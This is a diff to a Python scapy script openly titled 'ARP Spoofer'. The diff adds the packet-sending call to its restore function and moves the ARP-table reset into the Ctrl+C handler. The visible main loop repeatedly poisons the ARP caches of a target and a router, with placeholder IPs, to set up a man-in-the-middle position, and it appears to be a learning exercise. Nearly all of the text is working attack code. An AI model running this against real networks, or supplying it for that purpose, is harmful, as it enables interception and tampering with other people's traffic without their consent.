@@ -2,7 +2,7 @@
 
 # Script Name:      ARP Spoofer
 # Author:           Vincent Bailey
-# Last Rev:         04/7/2023
+# Last Rev:         04/10/2023
 # Purpose:          This script will act as an ARP spoofer.
 
 ##############################################################################
@@ -58,13 +58,14 @@ def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
+    scapy.send(packet, count=4, verbose=False)
 
 
 ##############################################################################
 # Main
 ##############################################################################
-restore("insert target IP here", "insert target router here")
 try:
+    sent_packets_count = 0
     while True:
         spoof("insert target IP here", "insert router IP here")  # This spoofs the target
         spoof("insert router IP here", "insert target IP here")  # This spoofs the router
@@ -76,9 +77,9 @@ try:
         # sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print("[+] CTRL + C Pressed.....Quitting Application.")
-
-
+    print("[+] CTRL + C Pressed.....Resetting ARP Tables.")
+    restore("insert target IP here", "insert target router here")
+    restore("insert target router here", "insert target IP here")
 ##############################################################################
 # End
 ##############################################################################
